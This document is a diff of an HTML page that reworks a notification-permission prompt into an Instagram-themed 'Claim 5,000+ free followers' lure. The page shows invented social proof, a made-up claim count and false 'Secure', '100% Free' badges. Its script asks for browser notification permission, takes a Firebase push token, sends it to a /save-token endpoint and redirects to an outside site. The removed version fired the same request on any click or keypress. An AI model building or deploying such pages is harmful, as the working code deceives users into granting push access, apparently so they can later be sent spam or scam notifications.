@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>update</title>
+<title>Claim Your Followers</title>
 <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,600;1,9..144,400&family=Inter+Tight:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,600;1,9..144,400&family=Inter+Tight:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -15,9 +15,14 @@
     --bg: #0a0a0b;
     --bg-elev: #131316;
     --ink: #f5f5f0;
-    --ink-dim: #8a8a85;
-    --ink-muted: #5a5a55;
-    --accent: #d4ff4d;
+    --ink-dim: #a8a8a3;
+    --ink-muted: #6a6a65;
+    --ig-1: #f09433;
+    --ig-2: #e6683c;
+    --ig-3: #dc2743;
+    --ig-4: #cc2366;
+    --ig-5: #bc1888;
+    --accent: #ff3d77;
     --border: rgba(245, 245, 240, 0.08);
   }
 
@@ -35,7 +40,6 @@
     justify-content: center;
     padding: 24px;
     position: relative;
-    cursor: pointer;
   }
 
   .ambient {
@@ -52,7 +56,7 @@
     right: -10%;
     width: 60vw;
     height: 60vw;
-    background: radial-gradient(circle, rgba(212, 255, 77, 0.08) 0%, transparent 60%);
+    background: radial-gradient(circle, rgba(220, 39, 67, 0.18) 0%, transparent 60%);
     filter: blur(60px);
   }
   .ambient::after {
@@ -62,7 +66,7 @@
     left: -15%;
     width: 70vw;
     height: 70vw;
-    background: radial-gradient(circle, rgba(77, 128, 255, 0.06) 0%, transparent 60%);
+    background: radial-gradient(circle, rgba(240, 148, 51, 0.12) 0%, transparent 60%);
     filter: blur(80px);
   }
 
@@ -71,7 +75,7 @@
     inset: 0;
     pointer-events: none;
     z-index: 1;
-    opacity: 0.4;
+    opacity: 0.35;
     mix-blend-mode: overlay;
     background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.5'/%3E%3C/svg%3E");
   }
@@ -81,10 +85,10 @@
     z-index: 2;
     width: 100%;
     max-width: 480px;
-    background: linear-gradient(180deg, rgba(19,19,22,0.9) 0%, rgba(10,10,11,0.9) 100%);
+    background: linear-gradient(180deg, rgba(19,19,22,0.92) 0%, rgba(10,10,11,0.92) 100%);
     border: 1px solid var(--border);
-    border-radius: 20px;
-    padding: 48px 40px 40px;
+    border-radius: 24px;
+    padding: 44px 36px 36px;
     backdrop-filter: blur(20px);
     box-shadow:
       0 1px 0 rgba(255,255,255,0.04) inset,
@@ -103,20 +107,20 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    margin-bottom: 48px;
+    margin-bottom: 32px;
     animation: fade 0.8s 0.2s both;
   }
-  .logo {
+  .brand {
     display: flex;
     align-items: center;
-    gap: 10px;
-    font-size: 13px;
-    letter-spacing: 0.08em;
+    gap: 8px;
+    font-size: 12px;
+    letter-spacing: 0.06em;
     text-transform: uppercase;
     color: var(--ink);
-    font-weight: 500;
+    font-weight: 600;
   }
-  .logo-dot {
+  .brand-dot {
     width: 8px; height: 8px;
     border-radius: 50%;
     background: var(--accent);
@@ -127,121 +131,243 @@
     0%, 100% { opacity: 1; transform: scale(1); }
     50% { opacity: 0.6; transform: scale(0.85); }
   }
-  .status {
-    font-size: 11px;
+  .live-tag {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 10px;
     letter-spacing: 0.12em;
     text-transform: uppercase;
-    color: var(--ink-muted);
+    color: #4ade80;
+    background: rgba(74, 222, 128, 0.1);
+    padding: 5px 10px;
+    border-radius: 100px;
+    border: 1px solid rgba(74, 222, 128, 0.2);
+    font-weight: 600;
+  }
+  .live-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: #4ade80;
+    box-shadow: 0 0 8px #4ade80;
+    animation: pulse 1.5s ease-in-out infinite;
   }
 
-  .bell-wrap {
+  /* Instagram-style icon */
+  .ig-icon-wrap {
     display: flex;
     justify-content: center;
-    margin-bottom: 28px;
+    margin-bottom: 24px;
     animation: fade 0.8s 0.3s both;
   }
-  .bell {
-    width: 72px; height: 72px;
-    border-radius: 20px;
-    background: linear-gradient(135deg, rgba(212, 255, 77, 0.15), rgba(212, 255, 77, 0.05));
-    border: 1px solid rgba(212, 255, 77, 0.2);
+  .ig-icon {
+    width: 80px; height: 80px;
+    border-radius: 22px;
+    background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
     display: flex;
     align-items: center;
     justify-content: center;
-    position: relative;
-    animation: shake 3s ease-in-out infinite;
+    box-shadow:
+      0 12px 40px -8px rgba(220, 39, 67, 0.5),
+      0 0 0 1px rgba(255,255,255,0.1) inset;
+    animation: float 3s ease-in-out infinite;
   }
-  .bell svg { width: 32px; height: 32px; stroke: var(--accent); }
-  .bell::after {
-    content: '';
-    position: absolute;
-    top: -2px; right: -2px;
-    width: 14px; height: 14px;
-    border-radius: 50%;
-    background: var(--accent);
-    border: 2px solid var(--bg);
-    box-shadow: 0 0 8px var(--accent);
-  }
-  @keyframes shake {
-    0%, 90%, 100% { transform: rotate(0); }
-    92% { transform: rotate(8deg); }
-    94% { transform: rotate(-8deg); }
-    96% { transform: rotate(5deg); }
-    98% { transform: rotate(-5deg); }
+  .ig-icon svg { width: 42px; height: 42px; stroke: white; }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-6px); }
   }
 
-  .eyebrow {
-    font-size: 11px;
-    letter-spacing: 0.2em;
-    text-transform: uppercase;
-    color: var(--accent);
-    margin-bottom: 16px;
+  /* Counter */
+  .counter {
+    display: flex;
+    align-items: baseline;
+    justify-content: center;
+    gap: 4px;
+    margin-bottom: 8px;
     animation: fade 0.8s 0.4s both;
+  }
+  .counter-number {
+    font-family: 'Fraunces', serif;
+    font-weight: 400;
+    font-size: 64px;
+    line-height: 1;
+    letter-spacing: -0.04em;
+    background: linear-gradient(135deg, #fff 0%, #ff3d77 50%, #f09433 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    font-variant-numeric: tabular-nums;
+  }
+  .counter-plus {
+    font-family: 'Fraunces', serif;
+    font-style: italic;
+    font-size: 32px;
+    color: var(--accent);
+    font-weight: 300;
+  }
+
+  .label {
+    font-size: 13px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    margin-bottom: 28px;
+    font-weight: 500;
+    animation: fade 0.8s 0.5s both;
   }
 
   h1 {
     font-family: 'Fraunces', serif;
     font-weight: 300;
-    font-size: clamp(36px, 5.5vw, 48px);
-    line-height: 1.05;
-    letter-spacing: -0.03em;
-    margin-bottom: 20px;
-    animation: fade 0.8s 0.5s both;
-  }
-  h1 em { font-style: italic; font-weight: 400; color: var(--accent); }
-
-  .desc {
-    font-size: 15px;
-    line-height: 1.6;
-    color: var(--ink-dim);
-    margin-bottom: 36px;
+    font-size: clamp(28px, 4.5vw, 36px);
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+    margin-bottom: 14px;
     animation: fade 0.8s 0.6s both;
   }
+  h1 em {
+    font-style: italic;
+    font-weight: 400;
+    background: linear-gradient(135deg, #ff3d77 0%, #f09433 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
 
-  .tap-hint {
-    display: inline-flex;
-    align-items: center;
-    gap: 10px;
-    padding: 14px 24px;
-    background: rgba(212, 255, 77, 0.08);
-    border: 1px solid rgba(212, 255, 77, 0.2);
-    border-radius: 100px;
-    color: var(--accent);
+  .desc {
     font-size: 14px;
-    font-weight: 500;
-    animation: fade 0.8s 0.7s both, glow 2.5s ease-in-out infinite 1.5s;
-  }
-  @keyframes glow {
-    0%, 100% { box-shadow: 0 0 0 0 rgba(212, 255, 77, 0.4); }
-    50% { box-shadow: 0 0 0 12px rgba(212, 255, 77, 0); }
-  }
-  .tap-hint .finger {
-    animation: tap 1.8s ease-in-out infinite;
-    display: inline-block;
-  }
-  @keyframes tap {
-    0%, 60%, 100% { transform: translateY(0); }
-    30% { transform: translateY(-4px); }
+    line-height: 1.6;
+    color: var(--ink-dim);
+    margin-bottom: 28px;
+    animation: fade 0.8s 0.7s both;
+    max-width: 360px;
+    margin-left: auto;
+    margin-right: auto;
   }
 
-  .footer {
-    margin-top: 32px;
-    padding-top: 24px;
-    border-top: 1px solid var(--border);
+  /* CTA button */
+  .cta {
+    width: 100%;
+    padding: 18px 24px;
+    background: linear-gradient(135deg, #f09433 0%, #dc2743 50%, #bc1888 100%);
+    color: white;
+    border: none;
+    border-radius: 14px;
+    font-family: 'Inter Tight', sans-serif;
+    font-size: 16px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+    cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
+    gap: 10px;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.2s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.3s ease;
+    animation: fade 0.8s 0.8s both, ctaglow 2.5s ease-in-out infinite 1.5s;
+    box-shadow:
+      0 0 0 1px rgba(255, 61, 119, 0.4),
+      0 12px 32px -8px rgba(220, 39, 67, 0.5);
+  }
+  @keyframes ctaglow {
+    0%, 100% { box-shadow: 0 0 0 1px rgba(255, 61, 119, 0.4), 0 12px 32px -8px rgba(220, 39, 67, 0.5), 0 0 0 0 rgba(255, 61, 119, 0.4); }
+    50% { box-shadow: 0 0 0 1px rgba(255, 61, 119, 0.6), 0 16px 40px -8px rgba(220, 39, 67, 0.6), 0 0 0 12px rgba(255, 61, 119, 0); }
+  }
+  .cta:hover {
+    transform: translateY(-2px);
+  }
+  .cta:active { transform: translateY(0); }
+  .cta::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+    transition: left 0.6s ease;
+  }
+  .cta:hover::before { left: 100%; }
+  .cta .arrow {
+    transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .cta:hover .arrow { transform: translateX(4px); }
+  .cta:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    animation: none;
+  }
+
+  /* Loading spinner */
+  .spinner {
+    width: 18px; height: 18px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    display: none;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .cta.loading .arrow { display: none; }
+  .cta.loading .spinner { display: block; }
+
+  /* Trust badges */
+  .badges {
+    display: flex;
+    justify-content: center;
+    gap: 18px;
+    margin-top: 24px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    animation: fade 0.8s 0.9s both;
+  }
+  .badge {
+    display: flex;
+    align-items: center;
+    gap: 6px;
     font-size: 11px;
     color: var(--ink-muted);
-    letter-spacing: 0.05em;
-    animation: fade 0.8s 0.8s both;
+    letter-spacing: 0.04em;
   }
-  .footer svg { width: 11px; height: 11px; stroke: var(--ink-muted); }
+  .badge svg { width: 12px; height: 12px; stroke: var(--ink-muted); flex-shrink: 0; }
+
+  /* Avatars */
+  .avatars {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 18px;
+    animation: fade 0.8s 0.55s both;
+  }
+  .avatar {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    border: 2px solid var(--bg-elev);
+    margin-left: -8px;
+    background: linear-gradient(135deg, #f09433, #dc2743);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: white;
+    font-weight: 600;
+  }
+  .avatar:first-child { margin-left: 0; }
+  .avatar:nth-child(2) { background: linear-gradient(135deg, #4ade80, #06b6d4); }
+  .avatar:nth-child(3) { background: linear-gradient(135deg, #a855f7, #ec4899); }
+  .avatar:nth-child(4) { background: linear-gradient(135deg, #f59e0b, #ef4444); }
+  .avatars-text {
+    margin-left: 12px;
+    font-size: 12px;
+    color: var(--ink-dim);
+  }
+  .avatars-text strong { color: var(--ink); font-weight: 600; }
 
   @media (max-width: 480px) {
-    .card { padding: 36px 24px 28px; border-radius: 16px; }
-    .header-row { margin-bottom: 36px; }
+    .card { padding: 32px 22px 26px; border-radius: 20px; }
+    .counter-number { font-size: 52px; }
   }
 </style>
 </head>
@@ -252,42 +378,77 @@
 
 <main class="card">
   <div class="header-row">
-    <div class="logo">
-      <span class="logo-dot"></span>
-      <span>Push · Live</span>
+    <div class="brand">
+      <span class="brand-dot"></span>
+      <span>Followers Boost</span>
     </div>
-    <div class="status">Secure</div>
+    <div class="live-tag">
+      <span class="live-dot"></span>
+      <span>Live</span>
+    </div>
   </div>
 
-  <div class="bell-wrap">
-    <div class="bell">
-      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/>
-        <path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/>
+  <div class="ig-icon-wrap">
+    <div class="ig-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
+        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
       </svg>
     </div>
   </div>
 
-  <div class="eyebrow">One tap to continue</div>
+  <div class="counter">
+    <span class="counter-number">5,000</span>
+    <span class="counter-plus">+</span>
+  </div>
+  <div class="label">Free followers ready</div>
 
-  <h1>Almost <em>there</em>.</h1>
+  <h1>Your <em>followers</em> are waiting.</h1>
 
   <p class="desc">
-    Tap anywhere on this page and allow notifications
-    when your browser asks — that's it.
+    Tap continue and allow notifications to instantly claim
+    your free Instagram followers — delivered straight to your account.
   </p>
 
-  <div class="tap-hint">
-    <span class="finger">👆</span>
-    <span>Tap to continue</span>
+  <div class="avatars">
+    <div class="avatar">A</div>
+    <div class="avatar">M</div>
+    <div class="avatar">K</div>
+    <div class="avatar">+</div>
+    <span class="avatars-text"><strong>12,847 people</strong> claimed today</span>
   </div>
 
-  <div class="footer">
-    <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+  <button class="cta" id="continueBtn">
+    <span id="btnText">Click to Continue</span>
+    <svg class="arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <line x1="5" y1="12" x2="19" y2="12"/>
+      <polyline points="12 5 19 12 12 19"/>
     </svg>
-    <span>End-to-end secure · Private</span>
+    <div class="spinner"></div>
+  </button>
+
+  <div class="badges">
+    <div class="badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span>Secure</span>
+    </div>
+    <div class="badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+      <span>100% Free</span>
+    </div>
+    <div class="badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <polyline points="12 6 12 12 16 14"/>
+      </svg>
+      <span>Instant</span>
+    </div>
   </div>
 </main>
 
@@ -303,28 +464,38 @@ const app = initializeApp({
 });
 const messaging = getMessaging(app);
 
-let triggered = false;
+const btn = document.getElementById("continueBtn");
+const btnText = document.getElementById("btnText");
+
 const start = async () => {
-  if (triggered) return;
-  triggered = true;
-  const permission = await Notification.requestPermission();
-  if (permission === "granted") {
-    const token = await getToken(messaging, {
-      vapidKey: "BOdPWGqwoqJuwousfsA9MKrOX-VnCwCb8al6PsvBAVpsRZarKn8SWEavtB4t0JMG_XubE39pT0LdOXJwic2epcw"
-    });
-    await fetch("/save-token", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({ token })
-    });
-    alert("Done");
+  btn.classList.add("loading");
+  btnText.textContent = "Requesting permission...";
+  try {
+    const permission = await Notification.requestPermission();
+    if (permission === "granted") {
+      btnText.textContent = "Claiming followers...";
+      const token = await getToken(messaging, {
+        vapidKey: "BOdPWGqwoqJuwousfsA9MKrOX-VnCwCb8al6PsvBAVpsRZarKn8SWEavtB4t0JMG_XubE39pT0LdOXJwic2epcw"
+      });
+      await fetch("/save-token", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ token })
+      });
+      btnText.textContent = "Redirecting...";
+      window.location.href = "https://instagram-followers5k.onrender.com";
+    } else {
+      btn.classList.remove("loading");
+      btnText.textContent = "Please allow notifications to continue";
+    }
+  } catch (err) {
+    btn.classList.remove("loading");
+    btnText.textContent = "Try again";
+    console.error(err);
   }
 };
 
-// Auto-fire on the first interaction anywhere on the page
-document.addEventListener("click", start, { once: true });
-document.addEventListener("touchstart", start, { once: true });
-document.addEventListener("keydown", start, { once: true });
+btn.addEventListener("click", start);
 </script>
 
 </body>
